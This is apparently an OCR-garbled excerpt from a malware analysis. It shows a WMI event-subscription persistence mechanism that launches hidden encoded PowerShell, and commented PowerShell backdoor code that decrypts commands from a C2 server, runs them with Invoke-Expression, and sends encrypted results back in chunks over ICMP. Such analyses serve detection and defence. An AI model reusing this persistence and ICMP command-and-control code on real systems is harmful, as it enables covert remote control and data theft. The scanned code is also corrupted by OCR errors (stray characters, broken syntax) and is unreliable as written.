'109
Namespace = //./root/subscription; Eventfilter = SystemPowerManager (refer to its
activate eventid:5859); Consumer = CommandLineEventConsumer="SystemPowerManager"
PossibleCause = Binding EventFilter:
instance of
EventFilter
{
EventNamespace = "root\\cimv2":
Name = "SystemPowerManager"
Query = "SELECT * FROM
InstanceModificationEvent WITHIN 120 WHERE
TargetInstance IS 'Win32_PerfFormattedData_Perf0S_System'"
QueryLanguage =
"WOL"
}:
Perm. Consumer:
instance of CommandLineEventConsumer
{
CommandLineIemplate = "powershell -window hidden -enc <$ENCODED_COMMAND>"
Name =
"SystemPowerManager"
};

powershell
if (Sreply.Buffer) {
# If the reply is not null and the reply buffer is not null, then the reply
buffer is decrypted and executed
# The reply buffer is decrypted and executed
Sresponse = (Sreply. Buffer);
$d _response = Decrypt ($response); # The reply buffer is decrypted
# Invoke-Expression is used to execute the decrypted response
try
{
$result = (Invoke-Expression -command $d response 2>81 | out-string); #
Invoke-Expression is used to execute the decrypted response
}
catch {
# If the Invoke-Expression fails, then the result is set to null
fresult = "";
# If the result is null, then the result is set to an empty string
if (-not $result) {
Sresult =
}

powershell
# If the result is greater than 128 bytes, then the result is split into chunks of 128
bytes
I Out-Null);
if ($sendbytes. length -gt §BufferSize)
{
# The chunks are encrypted and sent to the C2 server
while (Si -lt Sindex ) <
Ssendbytes2 = $sendbytes [ ($start)..((Si + 1) * $BufferSize)];
Ssendbytes2 = Encrypt(Ssendbytes2); # The chunk is encrypted
(SICMPClient. Send(SIPAddress, 60 * 100, Sfix + Ssendbytes2, §PingOptions)
Sstart = (($i + 1) * SufferSize) + 1;
Si += 1;
}
# If there are remaining bytes, then the remaining bytes are encrypted and
sent to the C2 server
# The $fix marker is added to the beginning of the encrypted data, and the
Spix marker is added to the end
# to indicate the last chunk of the data.
$remainingindex = Ssendbytes. Length % $BufferSize;
if (Sremainingindex -ne 0) {
Ssendbytes2 = Ssendbytes [(Sstart).. (Ssendbytes .Length)];
§sendbytes2 = Encrypt (§sendbytes2);
($ICMPClient. Send($IPAddress, 60 * 100, $fix + $sendbytes2 + $pix,
SPingOptions) | Out-Null);
# If the result is less than 128 bytes, then the result is encrypted and sent
to the C2 server
else
{
}
($ICMPClient. Send($IPAddress, 60 * 100, $pix, $PingOptions) | Out-Null);
}
# If the result is less than 128 bytes, then the result is encrypted and sent to
the C2 server
else {
$sendbytes = Encrypt($sendbytes);
(SICMPClient. Send(SIPAddress, 60 * 100, Sfix + §sendbytes + Spix,
$PingOptions) | Out-Null);
